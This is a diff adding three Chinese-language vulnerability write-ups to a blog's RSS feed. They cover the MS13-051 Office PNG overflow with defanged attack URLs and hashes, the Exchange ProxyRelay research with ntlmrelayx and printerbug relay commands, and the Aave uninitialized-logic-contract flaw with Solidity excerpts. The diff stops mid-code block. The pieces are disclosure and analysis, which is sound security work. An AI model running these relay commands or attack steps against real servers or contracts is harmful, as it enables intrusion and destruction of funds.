@@ -7,7 +7,289 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>qife</copyright>
-        <lastBuildDate>Sat, 02 Aug 2025 10:59:22 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 02 Aug 2025 23:13:07 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>MS13-051漏洞分析：Office PNG解析漏洞的技术细节与攻击模式</title>
+        <link>http://localhost:1313/p/ms13-051%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90office-png%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E4%B8%8E%E6%94%BB%E5%87%BB%E6%A8%A1%E5%BC%8F/</link>
+        <pubDate>Sat, 02 Aug 2025 23:13:07 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/ms13-051%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90office-png%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E4%B8%8E%E6%94%BB%E5%87%BB%E6%A8%A1%E5%BC%8F/</guid>
+        <description>&lt;h1 id=&#34;ms13-051get-out-of-my-office&#34;&gt;MS13-051：Get Out of My Office!
+&lt;/h1&gt;&lt;p&gt;MS13-051修复了Microsoft Office 2003和Office for Mac中的一个安全漏洞。较新版本的Windows版Office不受此漏洞影响，但Mac版Office 2011仍受影响。我们已发现该漏洞在野外的针对性0day攻击中被利用。&lt;/p&gt;
+&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
+&lt;/h2&gt;&lt;p&gt;在Office的PNG文件解析代码中，存在对块长度字段检查不严的漏洞。根据PNG规范(&lt;a class=&#34;link&#34; href=&#34;http://www.w3.org/TR/PNG/#5Chunk-layout&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://www.w3.org/TR/PNG/#5Chunk-layout&lt;/a&gt;)，&amp;ldquo;虽然编码器和解码器应将长度视为无符号数，但其值不应超过2^31-1字节&amp;rdquo;。然而在恶意PNG文件中，我们发现块长度字段被设置为0xFFFFFFFF。PNG解析代码虽然正确将该字段视为无符号数，但未检查该值是否超过2^31-1的限制。&lt;/p&gt;
+&lt;p&gt;Shellcode分析显示该漏洞利用是典型的基于栈的缓冲区溢出，攻击者通过向栈上缓冲区写入超量数据，最终劫持程序执行流。旧版Office/Windows缺乏针对此类攻击的缓解措施，而新版则具备防护能力。我们也验证了EMET 3.0及以上版本能有效阻止已观察到的攻击。&lt;/p&gt;
+&lt;h2 id=&#34;攻击模式&#34;&gt;攻击模式
+&lt;/h2&gt;&lt;p&gt;观察到的攻击具有高度针对性，攻击者刻意规避安全研究人员调查。恶意样本是Office 2003二进制格式文档，其中不直接包含恶意PNG文件，而是通过引用远程服务器上的PNG文件实现攻击。&lt;/p&gt;
+&lt;p&gt;攻击者还在服务器上部署了脚本，避免多次提供PNG漏洞利用文件，以保持0day的隐蔽性。已观察到的攻击主要分布在印度尼西亚和马来西亚地区。&lt;/p&gt;
+&lt;h2 id=&#34;检测建议&#34;&gt;检测建议
+&lt;/h2&gt;&lt;p&gt;所有恶意文档的共同特征是使用&amp;quot;space.gif&amp;quot;文件名获取远程PNG漏洞文件。为帮助安全厂商和企业检测潜在威胁，我们提供部分用于加载远程PNG漏洞的URL和恶意Office文档哈希值：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;恶意URL示例&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hXXp://intent.nofrillspace.com/users/web11_focus/4307/space.gif
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hXXp://intent.nofrillspace.com/users/web11_focus/3807/space.gif
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hXXp://mister.nofrillspace.com/users/web8_dice/3791/space.gif
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;文档哈希值&lt;/strong&gt;:&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;MD5&lt;/th&gt;
+          &lt;th&gt;SHA1&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;fde37e60cc4be73dada0fb1ad3d5f273&lt;/td&gt;
+          &lt;td&gt;1bdc1a0bc995c1beb363b11b71c14324be8577c9&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;2f1ab543b38a7ad61d5dbd72eb0524c4&lt;/td&gt;
+          &lt;td&gt;2a33542038a85db4911d7b846573f6b251e16b2d&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;感谢Google公司的Andrew Lyons和Neel Mehta的报告，以及Elia Florio和Cristian Craioveanu对本案例的帮助。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Neil Sikka, MSRC Engineering
+@neilsikka&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>MS Exchange新攻击面分析第四部：ProxyRelay技术揭秘</title>
+        <link>http://localhost:1313/p/ms-exchange%E6%96%B0%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%E7%AC%AC%E5%9B%9B%E9%83%A8proxyrelay%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/</link>
+        <pubDate>Sat, 02 Aug 2025 21:26:58 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/ms-exchange%E6%96%B0%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%E7%AC%AC%E5%9B%9B%E9%83%A8proxyrelay%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/</guid>
+        <description>&lt;h1 id=&#34;ms-exchange新攻击面分析第四部proxyrelay&#34;&gt;MS Exchange新攻击面分析第四部：ProxyRelay！
+&lt;/h1&gt;&lt;p&gt;这是来自DEVCORE的交叉发布博客。完整系列包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;MS Exchange新攻击面分析第一部：ProxyLogon！&lt;/li&gt;
+&lt;li&gt;MS Exchange新攻击面分析第二部：ProxyOracle！&lt;/li&gt;
+&lt;li&gt;MS Exchange新攻击面分析第三部：ProxyShell！&lt;/li&gt;
+&lt;li&gt;MS Exchange新攻击面分析第四部：ProxyRelay！&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;背景说明&#34;&gt;背景说明
+&lt;/h2&gt;&lt;p&gt;这篇迟来的文章原本可以更早发布（原始漏洞于2021年6月报告给MSRC，遵循90天公开披露政策）。在与MSRC沟通期间，他们解释由于这是架构设计问题，需要进行大量代码修改和测试，因此希望通过累积更新(CU)而非常规补丁周二一次性解决。我们理解这一情况并同意延长截止日期。&lt;/p&gt;
+&lt;p&gt;微软最终于2022年4月20日发布Exchange Server 2019 CU 12和Exchange Server 2016 CU 23，但该补丁默认未启用。直到2022年8月9日微软才发布补丁激活方法。我们本有机会在Pwn2Own Vancouver 2021展示攻击，但出于安全研究初衷放弃了参赛计划。&lt;/p&gt;
+&lt;h2 id=&#34;技术原理&#34;&gt;技术原理
+&lt;/h2&gt;&lt;p&gt;自2021年4月微软封堵Proxy系列攻击后，我们一直在探索绕过方案。当时微软通过增强CAS前端认证机制，要求所有需要Kerberos票据的HTTP请求必须先通过认证，有效阻止了未经认证的请求访问CAS后端。但Exchange真的安全了吗？&lt;/p&gt;
+&lt;p&gt;我们借鉴了打印机漏洞(Printer Bug)的思路：在Exchange架构中，后端通过检查登录身份是否拥有ms-Exch-EPI-Token-Serialization扩展权限来授权HTTP请求。由于Exchange服务器在安装时会自动加入Exchange Servers组，该组所有对象默认拥有此权限。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞利用&#34;&gt;漏洞利用
+&lt;/h2&gt;&lt;p&gt;我们发现了完整的攻击面而非单个漏洞，由此衍生出多个CVE：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CVE-2021-33768 - 中继到Exchange前端&lt;/li&gt;
+&lt;li&gt;CVE-2022-21979 - 中继到Exchange后端&lt;/li&gt;
+&lt;li&gt;CVE-2021-26414 - 中继到Exchange DCOM&lt;/li&gt;
+&lt;li&gt;CVE-2022-RESERVED - 中继到其他Exchange服务&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;第一轮中继到exchange前端&#34;&gt;第一轮：中继到Exchange前端
+&lt;/h3&gt;&lt;p&gt;通过强制EX01发起SMB连接，使用ntlmrelayx.py将NTLM认证中继到EX02前端的EWS服务。由于中继身份是拥有Token-Serialization权限的机器账户，我们可以模拟任意用户：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 终端1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ python ntlmrelayx.py -smb2support -t https://EX02/EWS/Exchange.asmx
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 终端2 &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ python printerbug.py EX01 ATTACKER
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;微软通过在前端代理处理程序添加IsSystemOrMachineAccount()检查来修复此问题（CVE-2021-33768）。&lt;/p&gt;
+&lt;h3 id=&#34;第二轮中继到exchange后端&#34;&gt;第二轮：中继到Exchange后端
+&lt;/h3&gt;&lt;p&gt;后端验证更为复杂，我们展示了三种攻击方式：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;攻击后端/EWS：只需将目标端口从443改为444&lt;/li&gt;
+&lt;li&gt;攻击后端/RPC：通过RPC-over-HTTP协议操作邮箱&lt;/li&gt;
+&lt;li&gt;攻击后端/PowerShell：实现类似ProxyShell的利用链&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;微软通过强制启用IIS的扩展保护认证修复此问题（CVE-2022-21979）。&lt;/p&gt;
+&lt;h3 id=&#34;第三轮中继到windows-dcom&#34;&gt;第三轮：中继到Windows DCOM
+&lt;/h3&gt;&lt;p&gt;基于Exchange服务器在AD环境中的组继承特性，EX01$机器账户也是EX02的本地管理员。通过中继到MS-DCOM可以实现RCE。微软分三个阶段逐步修复此问题（CVE-2021-26414）。&lt;/p&gt;
+&lt;h2 id=&#34;时间线&#34;&gt;时间线
+&lt;/h2&gt;&lt;p&gt;详细披露过程包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;2021年6月2日：通过MSRC门户报告漏洞&lt;/li&gt;
+&lt;li&gt;2022年4月20日：发布Exchange补丁&lt;/li&gt;
+&lt;li&gt;2022年8月18日：最终发布CVE和补丁激活文档&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;结语&#34;&gt;结语
+&lt;/h2&gt;&lt;p&gt;这个系列研究历时两年，期间经历了漏洞碰撞、Pwn2Own竞赛、顶级会议演讲等事件。我们始终秉持安全研究的初心，希望通过这些发现帮助提升Exchange服务器的安全性。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>揭秘Aave可升级合约漏洞 - 代理模式下的致命缺陷</title>
+        <link>http://localhost:1313/p/%E6%8F%AD%E7%A7%98aave%E5%8F%AF%E5%8D%87%E7%BA%A7%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E-%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E8%87%B4%E5%91%BD%E7%BC%BA%E9%99%B7/</link>
+        <pubDate>Sat, 02 Aug 2025 21:04:25 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E6%8F%AD%E7%A7%98aave%E5%8F%AF%E5%8D%87%E7%BA%A7%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E-%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E8%87%B4%E5%91%BD%E7%BC%BA%E9%99%B7/</guid>
+        <description>&lt;h1 id=&#34;breaking-aave-upgradeability&#34;&gt;Breaking Aave Upgradeability
+&lt;/h1&gt;&lt;p&gt;2020年12月3日，Aave部署了其代码库的V2版本。虽然我们未被雇佣进行代码审计，但在次日我们对其进行了简要检查。我们迅速发现了一个同时影响V1和V2线上合约的漏洞并立即报告。Aave团队在收到分析报告后一小时内就修复了该漏洞。若被利用，该漏洞将摧毁Aave系统并影响外部DeFi合约中的资金。&lt;/p&gt;
+&lt;p&gt;尽管有五家安全公司（包括使用形式化验证的机构）审计过Aave代码库，但此漏洞仍被遗漏。本文将详述该漏洞原理、为何未被发现以及经验教训。同时我们开源了新的Slither检测器以提升以太坊生态安全性。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞原理&#34;&gt;漏洞原理
+&lt;/h2&gt;&lt;p&gt;Aave使用了我们此前多次讨论的delegatecall代理模式。该模式将组件分为：1)包含实现逻辑的逻辑合约；2)包含数据并通过delegatecall与逻辑合约交互的代理合约。用户与代理合约交互，而代码在逻辑合约执行。以下是简化示意图：&lt;/p&gt;
+&lt;p&gt;在Aave中，LendingPool(LendingPool.sol)是采用delegatecall代理的可升级组件。该漏洞依赖两个关键特性：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;逻辑合约的函数（包括初始化函数）可直接调用&lt;/li&gt;
+&lt;li&gt;借贷池自身具有delegatecall能力&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;可升级合约初始化&#34;&gt;可升级合约初始化
+&lt;/h2&gt;&lt;p&gt;这种升级模式的限制在于代理合约无法依赖逻辑合约的构造函数进行初始化。因此状态变量和初始设置必须在公开的初始化函数中完成，这些函数无法享受构造函数的保护机制。&lt;/p&gt;
+&lt;p&gt;在LendingPool中，initialize函数设置provider地址(_addressesProvider)：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;initialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ILendingPoolAddressesProvider&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;provider&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;initializer&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;_addressesProvider&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;provider&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;initializer修饰符防止多次调用initialize，要求满足以下条件：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;initializing&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;isConstructor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;revision&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lastInitializedRevision&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s&#34;&gt;&amp;#39;Contract instance has already been initialized&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;其中：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;initializing允许同一交易内多次调用&lt;/li&gt;
+&lt;li&gt;isConstructor()供代理合约执行代码所需&lt;/li&gt;
+&lt;li&gt;revision &amp;gt; lastInitializedRevision允许合约升级时再次调用初始化函数&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;通过代理调用时工作正常，但第三条也允许任何人直接调用逻辑合约的initialize函数。当逻辑合约部署后：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;revision为0x2&lt;/li&gt;
+&lt;li&gt;lastInitializedRevision为0x0&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;漏洞本质&lt;/strong&gt;：任何人都能设置LendingPool逻辑合约的_addressesProvider。&lt;/p&gt;
+&lt;h2 id=&#34;任意delegatecall&#34;&gt;任意delegatecall
+&lt;/h2&gt;&lt;p&gt;LendingPool.liquidationCall直接delegatecall到_addressProvider返回的地址：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;address&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;collateralManager&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_addressesProvider&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;getLendingPoolCollateralManager&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;bool&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;bytes&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;memory&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;collateralManager&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;delegatecall&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;abi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;encodeWithSignature&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s&#34;&gt;&amp;#39;liquidationCall(address,address,address,uint256,bool)&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;collateralAsset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;debtAsset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;debtToCover&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;receiveAToken&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这使得攻击者可：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;初始化LendingPool逻辑合约&lt;/li&gt;
+&lt;li&gt;设置受控的addresses provider&lt;/li&gt;
+&lt;li&gt;执行任意代码（包括selfdestruct）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;攻击场景&lt;/strong&gt;：任何人都能销毁借贷池逻辑合约。简化示意图如下：&lt;/p&gt;
+&lt;h2 id=&#34;存在性检查缺失&#34;&gt;存在性检查缺失
+&lt;/h2&gt;&lt;p&gt;该漏洞本身已足够严重（可类比Parity事件）。但OpenZeppelin代理合约的使用放大了危害。我们2018年的博文曾指出：对空合约的delegatecall会返回success但不会执行任何代码。尽管有此警告，OpenZeppelin仍未修复其代理合约的回退函数：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
